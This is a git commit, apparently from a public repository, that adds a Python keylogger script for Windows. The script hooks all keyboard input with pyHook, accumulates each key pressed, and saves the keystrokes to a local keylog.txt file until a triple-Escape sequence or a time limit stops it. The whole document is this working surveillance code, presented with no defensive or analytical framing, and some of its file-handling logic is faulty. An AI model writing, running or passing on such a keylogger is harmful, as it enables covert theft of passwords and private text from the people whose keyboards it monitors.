3a9f297d0aad6d34d66feeab5cb3d1a704f0389c
nip403 <41174986+nip403@users.noreply.github.com>
2019-01-08 17:49:40 +0000

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,39 @@
+import pythoncom
+import pyHook
+import time
+import sys
+import os
+
+string = ""
+t0 = time.time()
+
+maxTime = None # if max = None, unlimited
+saveInterval = 1
+
+def keypressed(event):
+    global string
+    
+    string += str(event.GetKey())
+
+    return True 
+
+obj = pyHook.HookManager()
+obj.KeyDown = keypressed
+obj.HookKeyboard()
+
+with open("keylog.txt","r+" if os.path.exists("keylog.txt") else "w+") as f:
+    while True:
+        pythoncom.PumpWaitingMessages()
+        t1 = time.time()
+
+        if "EscapeEscapeEscape" in string or (maxTime is not None and int((t1-t0)/60) >= maxTime):
+            break
+
+        if not int((t1-t0)/60) % 2 and int((t1-t0)/60):
+            f.write(f.read()+string)
+            string = ""
+        
+    f.write(f.read()+string.strip("EscapeEscapeEscape"))
+    f.close()
+    sys.exit()
+    
